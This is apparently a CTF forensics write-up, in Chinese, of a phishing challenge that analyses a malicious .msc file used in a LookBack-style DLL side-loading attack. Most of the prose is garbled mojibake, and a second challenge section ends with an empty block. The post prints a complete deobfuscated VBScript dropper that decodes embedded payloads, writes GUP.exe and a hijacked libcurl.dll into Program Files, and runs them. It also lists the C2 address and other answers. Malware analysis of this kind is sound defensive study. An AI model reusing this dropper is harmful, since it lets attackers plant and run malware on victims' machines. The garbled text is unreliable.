---
layout: mypost
title: "2024å¼ºç½‘æ¯Miscæ–¹å‘"
categories: [ctf_wp]
---

## å‰è¨€

å¥½ä¹…æ²¡è§åˆ°CTFä¸­ä¸€äº›é«˜è´¨é‡çš„æµé‡é¢˜ç›®ï¼Œqwbæ€»ç®—æ˜¯ç¢°ä¸Šå‡ é“äº†ï¼Œé‚è®°å½•ğŸ“ä¸€ä¸‹è¿™æ¬¡æ¯”èµ›ä¸­çš„ `Master of DFIR - Coffee` ä¸ `Master of DFIR - Phishing`è¿™ä¸¤ä¸ªé¢˜ç›®ï¼Œä¸‹é¢æ˜¯é¢˜ç›®é™„ä»¶ğŸ“-->

```
é¢˜ç›®é™„ä»¶
```

## Master of DFIR - Phishing

ä¸é™é”™è¯¯æ¬¡æ•°ï¼Œç­”å¯¹ä¹‹åå‡ºç°ä¸‹ä¸€ä¸ªé—®é¢˜ï¼Œä¸€å…±æœ‰13ä¸ªé—®é¢˜

```
Team token > ***
(1/13) æ”»å‡»è€…çš„é‚®ç®±æ˜¯ä»€ä¹ˆ? (æ³¨æ„:MD5(æ”»å‡»è€…é‚®ç®±), ä»¥ cyberchef çš„ä¸ºå‡†) ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > a8cd5b4ba47e185d4a69a583fde84da5
æ­£ç¡®âœ…!
(2/13) æ”»å‡»è€…æ‰€æŠ•æ”¾çš„æ–‡ä»¶ md5 æ˜¯ä»€ä¹ˆ? (æ³¨æ„: ä»¥ md5sum çš„ç»“æœä¸ºå‡†) ç¤ºä¾‹:33ec9f546665aec46947dca16646d48e
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > f436b02020fa59f3f71e0b6dcac6c7d3
æ­£ç¡®âœ…!
(3/13) æ”»å‡»è€…æ‰€ä½¿ç”¨çš„æ”»å‡»è½½è·åç¼€æ˜¯ä»€ä¹ˆï¼Ÿ ç¤ºä¾‹:lnk
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > msc
æ­£ç¡®âœ…!
(4/13) æ”»å‡»è€…æ‰€æŠ•æ”¾æ ·æœ¬çš„åˆå§‹æ‰§è¡Œè¯­å¥åœ¨è¯¥æ”»å‡»è½½è·æ–‡ä»¶çš„ç¬¬å‡ è¡Œ? ç¤ºä¾‹:20
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > 97
æ­£ç¡®âœ…!
(5/13) ç»è¿‡åˆå§‹æ‰§è¡Œå, æ”»å‡»è€…æ‰€åŠ è½½çš„ç¬¬äºŒéƒ¨åˆ†è½½è·æ‰€ä½¿ç”¨çš„è¯­è¨€æ˜¯ä»€ä¹ˆ? ç¤ºä¾‹:javascript
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > VBScript
æ­£ç¡®âœ…!
(6/13) æ”»å‡»è€…æ‰€è¿›è¡Œçš„ç¬¬äºŒéƒ¨åˆ†è½½è·å…¶å°†é»‘ DLL å­˜åœ¨äº†ä»€ä¹ˆåœ°æ–¹? (æ³¨æ„: éœ€è¦æä¾›å®Œæˆçš„è§£æ··æ·†åçš„ç¬¬äºŒéƒ¨åˆ†è½½è· s*******s å‡½æ•°çš„å‚æ•°) æäº¤éœ€è¦ MD5(å‚æ•°å†…å®¹) ä»¥ Cyberchef ç»“æœä¸ºå‡† ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > d2fabdcc28074462ac2379101836c938
æ­£ç¡®âœ…!
(7/13) æ”»å‡»è€…ä½¿ç”¨çš„è¿™ä¸ªç™½ EXE åŠ è½½é»‘ DLL çš„æ‰‹æ³•æ‰€å¯¹åº”çš„ MITRE ATT&CK ID æ˜¯ä»€ä¹ˆ? (æ³¨æ„: è¯·æ³¨æ„ç¤ºä¾‹çš„æç¤ºæäº¤å¤§ç±»å³å¯ä¸éœ€è¦ç»†åŒ–åˆ°åˆ†é¡¹) ç¤ºä¾‹: T1000
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > T1574
æ­£ç¡®âœ…!
(8/13) æ”»å‡»è€…æ‰€ä½¿ç”¨çš„é»‘ DLL åŠ«æŒäº†åŸå§‹ DLL çš„å“ªä¸ªå‡½æ•°? ç¤ºä¾‹: main
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > curl_easy_init
æ­£ç¡®âœ…!
(9/13) æ”»å‡»è€…æ‰€ä½¿ç”¨çš„é»‘ DLL è§£å¯†ä¸‹ä¸€é˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„ç®—æ³•æ˜¯ä»€ä¹ˆ? ç¤ºä¾‹:chacha20
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > RC4
æ­£ç¡®âœ…!
(10/13) æ”»å‡»è€…æ‰€ä½¿ç”¨çš„ä¸‹ä¸€é˜¶æ®µè½½è·çš„å›è¿ C2 æ˜¯ä»€ä¹ˆ? (æ³¨æ„: éœ€è¦æä¾› ip åœ°å€: ç«¯å£çš„å½¢å¼) ç¤ºä¾‹:127.0.0.1:5100
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > 192.168.57.119:6000
æ­£ç¡®âœ…!
(11/13) æ”»å‡»è€…æ‰€ä½¿ç”¨æœ€ç»ˆé˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•æ˜¯ä»€ä¹ˆ? ç¤ºä¾‹:DES
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > AES
æ­£ç¡®âœ…!
(12/13) æ”»å‡»è€…æ‰€ä½¿ç”¨æœ€ç»ˆé˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„å¯†é’¥çš„ MD5 æ˜¯ä»€ä¹ˆ? (æ³¨æ„:MD5(å¯†é’¥å†…å®¹), ä»¥ cyberchef çš„ä¸ºå‡†) ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > a524c43df3063c33cfd72e2bf1fd32f6
æ­£ç¡®âœ…!
(13/13) æ”»å‡»è€…ä½¿ç”¨äº†ä»€ä¹ˆå®¶æ—çš„ C2? ç¤ºä¾‹:PoshC2
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆ > OrcaC2
æ­£ç¡®âœ…!
æ­å–œä½ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡, è¿™æ˜¯ä½ çš„ flag ğŸš© -->  ***
```

ä¸Šé¢æ˜¯æ‰€æœ‰çš„Q&Aï¼Œä¸‹é¢è®°å½•æ¯ä¸€å°é—®çš„è§£é¢˜æµç¨‹

1.å‘ä»¶äººé‚®ç®±æ˜¯ `alice@flycode.cn` cyberchefæ¢­äº†

![](1.png)

2.ä¸‹è½½é‚®ä»¶ä¸­çš„é™„ä»¶ï¼Œæ”¾å¾®æ­¥ä¸Šè®¡ç®—æ–‡ä»¶çš„md5

![](2.png)

3.è¾“å…¥å‹ç¼©åŒ…å¯†ç è§£å‹åå°±æ˜¯mscæ–‡ä»¶

4.æ”¾åˆ°cyberchefä¸­æŸ¥çœ‹ï¼Œå®šä½åˆ°92è¡Œä¸97è¡Œæœ‰å¯ç–‘çš„ä»£ç æ®µ

![](3.png)

ç”±äºé¢˜å¹²æ˜¯"åˆå§‹"æ‰§è¡Œè¯­å¥ï¼Œä¸éš¾çœ‹å‡ºä¸º97è¡Œçš„jsè„šæœ¬ï¼Œjsè„šæœ¬å†…å®¹å¦‚ä¸‹

```
javascript:eval(external.Document.ScopeNamespace.GetRoot().Name)
```

æ˜¾ç„¶æ˜¯å»åŠ è½½äº†ç¬¬92è¡Œçš„è¿™ä¸ªç¥ç§˜ä»£ç 

5.é¢˜ç›®æŒ‡æ˜äº†æ˜¯ç¬¬äºŒéƒ¨åˆ†è½½è·ï¼Œå†™ä¸ªæ­£åˆ™æŠŠè¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ç»™æå–å‡ºæ¥

![](4.png)

ç¾åŒ–ä¸€ä¸‹ï¼Œä¸éš¾å‘ç°æ˜¯ä¸€ä¸ªVBScriptå†™çš„æ¶æ„è„šæœ¬

![](5.png)

6.è¿™ä¸ªVBScriptä¸­å­˜åœ¨å¤§é‡çš„åƒåœ¾ä»£ç ä»¥åŠè¿™ç§ç”¨chr()ã€Int()ç­‰å‡½æ•°åšçš„æ··æ·†ï¼Œå»é™¤è¿™ç§æ··æ·†ä¸€èˆ¬çš„åšæ³•å°±æ˜¯è„šæœ¬åˆæ­¥åˆ†æ+AIæ ¼å¼åŒ–ï¼Œç»™ä¸€ä¸ªVBè„šæœ¬ï¼Œç”¨æ¥Executeè¿™ç§æ··æ·†çš„è„šæœ¬ã€‚

```
Function Defuscator(vbs)
	Dim t
	t = InStr(1, vbs, "Execute", 1)
	t = Mid(vbs, t + Len("Execute"))
	t = Eval(t)
	Defuscator = t
End Function
 
Dim fso, i, outFile
Const ForReading = 1, ForWriting = 2
Set fso = CreateObject("Scripting.FileSystemObject")
 
' åˆ›å»ºæˆ–æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºå†™å…¥è¾“å‡º
Set outFile = fso.OpenTextFile("output.txt", ForWriting, True)
 
For i = 0 To WScript.Arguments.Count - 1
	Dim FileName
	FileName = WScript.Arguments(i)
	Dim MyFile
	Set MyFile = fso.OpenTextFile(FileName, ForReading)
	Dim vbs
	vbs = MyFile.ReadAll
	outFile.WriteLine Defuscator(vbs)
	MyFile.Close
Next
 
outFile.Close
Set fso = Nothing
```

è„šæœ¬å‚è€ƒè‡ª-->[H&NCTF--Baby_OBVBS WP](https://blog.csdn.net/wcj126/article/details/138943956)ï¼Œæ€è·¯å‚è€ƒè‡ª-->[è„šæœ¬ç±»æ¶æ„ç¨‹åºåˆ†ææŠ€å·§æ±‡æ€» ](https://bbs.kanxue.com/thread-251102.htm)ï¼Œå°†ä»£ç ä¸­æ··æ·†çš„éƒ¨åˆ†ä¸€æ­¥ä¸€æ­¥çš„ç²˜è´´åˆ°æºæ–‡ä»¶ï¼Œç„¶åè¿è¡Œè¿™ä¸ªVBScriptï¼Œå¾—åˆ°è§£æ··æ·†ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œå…¨éƒ¨è¿›è¡Œæ›¿æ¢ï¼Œå¾—åˆ°å¦‚ä¸‹çš„ä»£ç 

```
Dim mscLL
mscLL = "_MSC"
For i = 1 To Len(mscLL) Step 4
    oFmXCTg = oFmXCTg & ChrW(CLng("&" & Chr(72) & Mid(mscLL, i, 4)))
Next
Set RTcxFmy = CreateObject("Microsoft.XMLDOM")
RTcxFmy.Async = False
RTcxFmy.Load(oFmXCTg)
AJ8p

Function Xk7fbp8v(inp)
    Dim q4XPbvoV
    Dim HxWK
    Set q4XPbvoV = CreateObject("MSXML2.DOMDocument")
    Set HxWK = q4XPbvoV.createElement("a")
    HxWK.DataType = "bin.base64"
    HxWK.Text = inp
    Xk7fbp8v = HxWK.nodeTypedValue
End Function

Function AJ8p()
    On Error Resume Next
    Dim AgUvcCuHzzbl
    Dim DfAV40y
    Dim gwqhhV
    Dim JJNe
    Dim Mw7U
    Dim O8B1OrkTW
    OMxa = "51734e8e7ec47ec753c252a07b2c516b5c4a201c5f3a7f51676f201d516856fd7f517edc5b895168631162188d5b7684901a77e5ff08003100316708003265e581f3003365e54e3e884c7ebf4e0a8d5bff09002e007000640066"
    Set AgUvcCuHzzbl = CreateObject("WScript.Shell")
    Set DfAV40y = CreateObject("Scripting.FileSystemObject")
    O8B1OrkTW = AgUvcCuHzzbl.ExpandEnvironmentStrings("%ProgramFiles%")
    P59b6scR2TD9 = O8B1OrkTW & "\Cloudflare"
    DfAV40y.CreateFolder(P59b6scR2TD9)
    gwqhhV = P59b6scR2TD9 & "\GUP.exe"
    JJNe = P59b6scR2TD9 & "\libcurl.dll"
    For i = 1 To Len(OMxa) Step 4
        FRURX = FRURX & ChrW(CLng("&" & Chr(72) & Mid(OMxa, i, 4)))
    Next
    Mw7U = DfAV40y.GetSpecialFolder(2) & Chr(92) & FRURX
    Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE']")
    rqsgO2mBfu = aZPHxtz4(0).text
    UoLAunW = Xk7fbp8v(rqsgO2mBfu)
    Dim jXnaWeLQ12
    Set jXnaWeLQ12 = CreateObject("ADODB.Stream")
    jXnaWeLQ12.Type = 1
    jXnaWeLQ12.Open
    jXnaWeLQ12.Write UoLAunW
    jXnaWeLQ12.SaveToFile Mw7U, 2
    AgUvcCuHzzbl.run """" & Mw7U & """", 1, False
    Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']")
    Ze1C = aZPHxtz4(0).text
    Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']")
    JozMh9jg = aZPHxtz4(0).text
    AnZUOdqFuMEw = Xk7fbp8v(Ze1C)
    s4fr2y4Q7lvQ = Xk7fbp8v(JozMh9jg)
    Dim cHh5wARUext
    Set cHh5wARUext = CreateObject("ADODB.Stream")
    cHh5wARUext.Type = 1
    cHh5wARUext.Open
    cHh5wARUext.Write AnZUOdqFuMEw
    cHh5wARUext.SaveToFile gwqhhV, 2
    Dim BKzG1ldRw7
    Set BKzG1ldRw7 = CreateObject("ADODB.Stream")
    BKzG1ldRw7.Type = 1
    BKzG1ldRw7.Open
    BKzG1ldRw7.Write s4fr2y4Q7lvQ
    BKzG1ldRw7.SaveToFile JJNe, 2
    AgUvcCuHzzbl.run """" & gwqhhV & """ t 8.8.8.8, 0, False"
End Function

Public Function i9Vu0(ByVal Value, ByVal Shift)
    i9Vu0 = Value
    If Shift > 0 Then
        If Value > 0 Then
            i9Vu0 = Int(i9Vu0 / (2 ^ Shift))
        Else
            If Shift > 31 Then
                i9Vu0 = 0
            Else
                i9Vu0 = i9Vu0 And &H7FFFFFFF
                i9Vu0 = Int(i9Vu0 / (2 ^ Shift))
                i9Vu0 = i9Vu0 Or 2 ^ (31 - Shift)
            End If
        End If
    End If
End Function

Public Function PIvwo4QDjBC(ByVal Value, ByVal Shift)
    PIvwo4QDjBC = Value
    If Shift > 0 Then
        Dim i, m
        For i = 1 To Shift
            m = PIvwo4QDjBC And &H40000000
            PIvwo4QDjBC = (PIvwo4QDjBC And &H3FFFFFFF) * 2
            If m <> 0 Then
                PIvwo4QDjBC = PIvwo4QDjBC Or &H80000000
            End If
        Next
    End If
End Function

Public Function eUBp1LoLYEMy(ByVal num)
    Const rkLx = 5570645
    Const beweT2U = 52428
    Const d1 = 7
    Const d2 = 14
    Dim t, u, out
    t = (num Xor i9Vu0(num, d2)) And beweT2U
    u = num Xor t Xor PIvwo4QDjBC(t, d2)
    t = (u Xor i9Vu0(u, d1)) And rkLx
    out = (u Xor t Xor PIvwo4QDjBC(t, d1))
    eUBp1LoLYEMy = out
End Function

Public Function FTKaWvcYaGWt(ByRef MiCzi9())
    Dim i, fr, upJNNa, raw
    Dim a, b, c, d
    Dim YBx4PZLTHSQ1
    Dim a2, b2
    YBx4PZLTHSQ1 = ""
    For i = 0 To (UBound(MiCzi9) / 4 + 1)
        fr = i * 4
        If fr > UBound(MiCzi9) Then
            Exit For
        End If
        upJNNa = 0
        upJNNa = upJNNa Or PIvwo4QDjBC(MiCzi9(fr + 3), 24)
        upJNNa = upJNNa Or PIvwo4QDjBC(MiCzi9(fr + 2), 16)
        upJNNa = upJNNa Or PIvwo4QDjBC(MiCzi9(fr + 1), 8)
        upJNNa = upJNNa Or MiCzi9(fr + 0)
        raw = eUBp1LoLYEMy(upJNNa)
        a = Chr(i9Vu0((raw And &HFF000000), 24))
        b = Chr(i9Vu0((raw And 16711680), 16))
        c = Chr(i9Vu0((raw And 65280), 8))
        d = Chr(i9Vu0((raw And 255), 0))
        YBx4PZLTHSQ1 = YBx4PZLTHSQ1 + d + c + b + a
    Next
    FTKaWvcYaGWt = YBx4PZLTHSQ1
End Function

Public Function t4zFxxgg22(MiCzi9)
    Dim CYhV8N(), Liefs(), arrayByte3(255)
    Dim Rp7jaY2jOqr(63), arrayLong5(63)
    Dim Mbt0mzk6(63), NALQp0Gu3
    Dim b7Z9n8, iter, VKkZEf, ZyvKLLyyHHD
    Dim YBx4PZLTHSQ1
    MiCzi9 = Replace(MiCzi9, vbCr, vbNullString)
    MiCzi9 = Replace(MiCzi9, vbLf, vbNullString)
    ZyvKLLyyHHD = Len(MiCzi9) Mod 4
    If InStrRev(MiCzi9, "==") Then
        b7Z9n8 = 2
    ElseIf InStrRev(MiCzi9, "+" & "=") Then
        b7Z9n8 = 1
    End If
    For ZyvKLLyyHHD = 0 To 255
        Select Case ZyvKLLyyHHD
            Case 65 To 90
                arrayByte3(ZyvKLLyyHHD) = ZyvKLLyyHHD - 65
            Case 97 To 122
                arrayByte3(ZyvKLLyyHHD) = ZyvKLLyyHHD - 71
            Case 48 To 57
                arrayByte3(ZyvKLLyyHHD) = ZyvKLLyyHHD + 4
            Case 43
                arrayByte3(ZyvKLLyyHHD) = 62
            Case 47
                arrayByte3(ZyvKLLyyHHD) = 63
        End Select
    Next
    For ZyvKLLyyHHD = 0 To 63
        Rp7jaY2jOqr(ZyvKLLyyHHD) = ZyvKLLyyHHD * 64
        arrayLong5(ZyvKLLyyHHD) = ZyvKLLyyHHD * 4096
        Mbt0mzk6(ZyvKLLyyHHD) = ZyvKLLyyHHD * 262144
    Next
    Liefs = StrConv(MiCzi9, vbFromUnicode)
    ReDim CYhV8N((((UBound(Liefs) + 1) \ 4) * 3) - 1)
    For iter = 0 To UBound(Liefs) Step 4
        NALQp0Gu3 = Mbt0mzk6(arrayByte3(Liefs(iter))) + arrayLong5(arrayByte3(Liefs(iter + 1))) + Rp7jaY2jOqr(arrayByte3(Liefs(iter + 2))) + arrayByte3(Liefs(iter + 3))
        ZyvKLLyyHHD = NALQp0Gu3 And 16711680
        CYhV8N(VKkZEf) = ZyvKLLyyHHD \ 65536
        ZyvKLLyyHHD = NALQp0Gu3 And 65280
        CYhV8N(VKkZEf + 1) = ZyvKLLyyHHD \ 256
        CYhV8N(VKkZEf + 2) = NALQp0Gu3 And 255
        VKkZEf = VKkZEf + 3
    Next
    YBx4PZLTHSQ1 = StrConv(CYhV8N, vbUnicode)
    If b7Z9n8 Then YBx4PZLTHSQ1 = Left(YBx4PZLTHSQ1, Len(YBx4PZLTHSQ1) - b7Z9n8)
    t4zFxxgg22 = FTKaWvcYaGWt(StrConv(YBx4PZLTHSQ1, vbFromUnicode))
    t4zFxxgg22 = qY7AOEpU1wn(t4zFxxgg22, "~")
End Function

Function qY7AOEpU1wn(str, chars)
    Dim fqX3dbudmU
    Dim XVZECKbx()
    XVZECKbx = Split(str, chars)
    fqX3dbudmU = UBound(XVZECKbx, 1)
    If fqX3dbudmU <> 0 Then
        str = Left(str, Len(str) - fqX3dbudmU)
    End If
    qY7AOEpU1wn = str
End Function
```

ç„¶åç»§ç»­è¿›ä¸€æ­¥çš„åˆ†æğŸ§ï¼Œç¬¬ä¸€æ®µæ²¡çœ‹å‡ºæ¥æœ‰å•¥ç”¨ï¼ŒCLng()å‡½æ•°æŠ¥é”™ï¼Œç„¶åè°ƒç”¨AJ8på‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°é‡Œé¢åšäº†å¾ˆå¤šçš„æ“ä½œï¼Œä»”ç»†å»ä¸€æ­¥æ­¥é˜…è¯»ä¸éš¾å‘ç°é‡Œé¢å»æ–°å»ºäº†è·¯å¾„ï¼Œè¯»å–äº†éšè—åœ¨xmlä¸­çš„æ¶æ„çš„16è¿›åˆ¶å­—ç¬¦ï¼Œç»è¿‡base64è§£ç ï¼ˆXk7fbp8v()å‡½æ•°æ˜¯ä¸€ä¸ªBase64è§£ç çš„ä¸€ä¸ªå‡½æ•°ï¼‰åå†™åˆ°æ–°åˆ›å»ºexeã€pdfã€dllä¸­ï¼Œå…³é”®çš„ä»£ç å¦‚ä¸‹-->

```
Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE']")
rqsgO2mBfu = aZPHxtz4(0).text

Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']")
Ze1C = aZPHxtz4(0).text
Set aZPHxtz4 = RTcxFmy.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']")
JozMh9jg = aZPHxtz4(0).text
AnZUOdqFuMEw = Xk7fbp8v(Ze1C)
s4fr2y4Q7lvQ = Xk7fbp8v(JozMh9jg)
```

ç„¶åå†å»ç”¨Cyberchefå°†åŸå§‹çš„é‚£ä¸ªmscæ–‡ä»¶ä¸­å°†`CONSOLE_TREE``CONSOLE_MENU``CONSOLE_PANE`åˆ†åˆ«æå–å‡ºæ¥è¿›è¡ŒBase64è§£ç ï¼Œä¾¿å¯ä»¥å¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶å¦‚ä¸‹

pdf

![](6.png)

exe

![](7.png)

dll

![](8.png)


é‚£ä¹ˆç¬¬6é¢˜çš„ç­”æ¡ˆä¹Ÿè¿åˆƒè€Œè§£äº†ï¼Œå°±æ˜¯å°†è¿™ä¸ªè·¯å¾„-->`/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_PANE']`è¿›è¡Œä¸€æ¬¡md5åŠ å¯†å³å¯ã€‚

![](9.png)

7.MITRE ATT&CK IDçš„è§£é‡Šå¯ä»¥å…ˆå‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« -->[ä¸€æ–‡è¯´æ¸…æ¥šMITRE ATT&CKå¨èƒæ¡†æ¶](https://xz.aliyun.com/t/14149?time__1311=GqAxu7G%3D84lx0nD2DU2DmxxRhlQvLox#toc-0)ï¼ŒåŸºæœ¬ç¡®å®šè¿™ä¸ªå¯èƒ½å°±æ˜¯ä¸€ä¸ªAPTæˆ–è€…æ˜¯ä¸€äº›å¤§ç¥å‘ç°çš„ç™½+é»‘ç»•EDRçš„æ‰‹æ³•è¢«å¼€æºå‡ºæ¥ï¼Œç›´æ¥è·‘å®˜ç½‘å»æœäº†ä¸€ä¸‹è¿™ä¸ªdllçš„åå­—`libcurl.dll`ï¼Œç¬¬7é¢˜çš„ç­”æ¡ˆä¾¿å‘¼ä¹‹æ¬²å‡ºã€‚

![](10.png)

ç¿»é˜…ååŸºæœ¬ç¡®å®šæ˜¯è¿™ä¸ªæ”»å‡»æ‰‹æ³•ï¼Œä¹Ÿå°±æ˜¯æœ¬æ¬¡é¢˜ç›®çš„å‡ºå¤„ï¼Œä¸‹é¢æ˜¯MITREæè¿°çš„è¿™æ¬¡äº‹ä»¶çš„Background

```
LookBack is a remote access trojan written in C++ that was used against at least three US utility companies in July 2019. The TALONITE activity group has been observed using LookBack.
```

![](11.png)

é˜…è¯»å®Œä¸Šé¢å¯¹æ”»å‡»æ‰‹æ³•çš„åˆ†æï¼Œåšä¸ªå°æ€»ç»“å¦‚ä¸‹

```
è¯¥æ¶æ„è½¯ä»¶å…·å¤‡å‘½ä»¤æ‰§è¡Œã€æˆªå›¾æ•è·ã€æ–‡ä»¶å‘ç°å’Œç³»ç»Ÿå…³é—­ç­‰åŠŸèƒ½ï¼Œå¹¶ä½¿ç”¨ HTTP è¿›è¡Œå‘½ä»¤ä¸æ§åˆ¶ï¼ˆC2ï¼‰é€šä¿¡ï¼Œé‡‡ç”¨ RC4 åŠ å¯†ã€‚å®ƒé€šè¿‡ä¼ªè£…æˆåˆæ³•è½¯ä»¶ä»¥é€ƒé¿æ£€æµ‹ï¼ŒåŒæ—¶æ”¯æŒæŒä¹…åŒ–è¿è¡Œï¼Œåˆ©ç”¨æ³¨å†Œè¡¨é”®è¿›è¡ŒéšåŒ¿
```

8.å»è¿™ä¸ªç½‘ç«™æ·±æŒ–ä¸€ä¸‹è¿™ä¸ªdllåŠ«æŒæˆ–è€…æ˜¯è¿™ä¸ªLookBackæœ¨é©¬çš„è¯¦æƒ…ï¼Œå»æ–‡ç« ä¸‹é¢ç»™å‡ºçš„å‚è€ƒé“¾æ¥å³å¯-->[LookBack Malware Targets the United States Utilities Sector with Phishing Attacks Impersonating Engineering Licensing Boards](https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks)

å‚è€ƒæ–‡çŒ®ä¸­çš„æ–‡ç« ä½œè€…æåˆ°äº†è¿™æ ·çš„ä¸€æ®µè¯-->

```
This dynamic link library appears to be a legitimate version of libcurl.dllâ€¯except forâ€¯a single exported function, which is referred to as ordinal #52 andâ€¯curl_share_initâ€¯in the analyzed sample. This function has been modified by threat actors to extract a resource contained within libcurl.dll, decrypt malicious dataâ€¯included in that resource, and load the resulting DLL to execute a malicious function. When this function is executed, theâ€¯SodomNormalâ€¯communications module begins running within Libcurl.dll.â€¯In addition to loading the communications module, the initial macro described above configures a persistence mechanism for this malware loader by setting upâ€¯aâ€¯Registryâ€¯Run key.â€¯The non-concatenated command included in the macro that establishes persistence for Libcurl.dll and the hash for this sample are included below.
```

å…¶ä¸­æ˜ç¡®å†™åˆ°äº†ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“è²Œä¼¼æ˜¯æ­£å¸¸çš„ï¼Œä½†å¾—é™¤äº†`curl_share_init`è¿™ä¸ªå‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°è¢«åŠ«æŒäº†ï¼Œä¸ä»…å»åŠ è½½äº†é€šä¿¡æ¨¡å—ï¼ŒåŒæ—¶è¿˜åšäº†æŒä¹…åŒ–çš„ç»´æƒæ“ä½œï¼Œä½†æ˜¯æäº¤curl_share_initè¿™ä¸ªå‡½æ•°åå­—ä¸å¯¹ï¼Œå¯èƒ½æ˜¯è¢«é¢˜ç›®ä½œè€…ä¿®æ”¹äº†ï¼Œåªå¥½å»æŠŠä¸Šé¢æå–å‡ºæ¥çš„æ¶æ„dllæ–‡ä»¶æ”¾IDAé‡Œé¢é™æ€åˆ†æä¸€ä¸‹ã€‚

å…ˆæ’é™¤æ‰éšè—å¯¼å…¥å¯¼å‡ºå‡½æ•°åå­—çš„æƒ…å†µï¼Œåˆ†åˆ«æŸ¥çœ‹exeçš„Importsè¡¨å’Œdllçš„Exportsè¡¨ï¼Œé‡åˆçš„å‡½æ•°æœ‰`curl_easy_init``curl_easy_setopt``curl_easy_perform``curl_easy_cleanup`è¿™å››ä¸ªå‡½æ•°ï¼Œé‚£å°±ç€é‡å…ˆçœ‹è¿™ä¸ªå››ä¸ªå‡½æ•°ï¼ŒæŸ¥çœ‹ä¸‹äº¤å‰å¼•ç”¨å¾ˆæ˜æ˜¾çš„å°±èƒ½å‘ç°curl_easy_initè¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªè¢«åŠ«æŒçš„å‡½æ•°ï¼Œå…¶ä»–ä¸‰ä¸ªå‡½æ•°éƒ½åªæ˜¯å»returnäº†dataæ®µä¸­çš„å€¼ï¼Œåªæœ‰curl_easy_initè¿™ä¸ªå‡½æ•°å»è°ƒç”¨äº†sub_10001240()å‡½æ•°ï¼Œä¸”é‡Œé¢å°±æ˜¯ä¸€æ®µè§£å¯†çš„å‡½æ•°ï¼Œç„¶åå»åˆ†æè¿™ä¸€æ®µè§£å¯†å‡½æ•°

![](12.png)

## Master of DFIR - Coffee

ä¸é™é”™è¯¯æ¬¡æ•°ï¼Œç­”å¯¹ä¹‹åå‡ºç°ä¸‹ä¸€ä¸ªé—®é¢˜ï¼Œä¸€å…±æœ‰9ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªé¢˜ç›®æ˜¯æµé‡åˆ†æé¢˜ç›®ï¼Œä¸Šé¢é‚£é“æ›´å¤šçš„æ˜¯å»åˆ†æä¸€æ¬¡ä¸­é’“é±¼äº‹ä»¶

```

```
